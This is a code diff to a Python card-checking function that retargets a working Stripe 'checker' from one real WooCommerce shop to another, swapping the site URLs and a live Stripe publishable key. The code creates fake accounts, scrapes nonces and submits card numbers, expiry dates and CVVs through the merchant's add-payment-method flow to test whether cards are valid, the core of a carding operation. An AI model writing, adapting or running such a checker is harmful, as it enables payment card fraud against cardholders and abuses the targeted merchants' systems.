@@ -20,7 +20,7 @@ def full_stripe_check(cc, mm, yy, cvv):
 
     try:
         # Step 1 & 2: Get login nonce
-        login_page_res = session.get('https://shop.wiseacrebrew.com/account/')
+        login_page_res = session.get('https://www.ftelettronica.com/my-account-2/')
         login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
         if not login_nonce_match:
             return {"status": "Declined", "response": "Failed to get login nonce.", "decline_type": "process_error"}
@@ -32,10 +32,10 @@ def full_stripe_check(cc, mm, yy, cvv):
             'email': random_email, 'password': 'Password123!', 'woocommerce-register-nonce': login_nonce,
             '_wp_http_referer': '/account/', 'register': 'Register',
         }
-        session.post('https://shop.wiseacrebrew.com/account/', data=register_data)
+        session.post('https://www.ftelettronica.com/my-account-2/', data=register_data)
 
         # Step 4: Get payment nonce with the valid session
-        payment_page_res = session.get('https://shop.wiseacrebrew.com/account/add-payment-method/')
+        payment_page_res = session.get('https://www.ftelettronica.com/my-account-2/add-payment-method/')
         payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
         if not payment_nonce_match:
             return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
@@ -44,7 +44,7 @@ def full_stripe_check(cc, mm, yy, cvv):
         # Step 5: Get Stripe payment token
         stripe_data = (
             f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}'
-            '&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'
+            '&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
         )
         stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
         if stripe_response.status_code == 402:
@@ -59,7 +59,7 @@ def full_stripe_check(cc, mm, yy, cvv):
             'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_token,
             'wc-stripe-payment-type': 'card', '_ajax_nonce': ajax_nonce,
         }
-        final_response = session.post('https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data)
+        final_response = session.post('https://www.ftelettronica.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data)
         response_json = final_response.json()
 
         if "Unable to verify your request" in response_json.get('messages', ''):
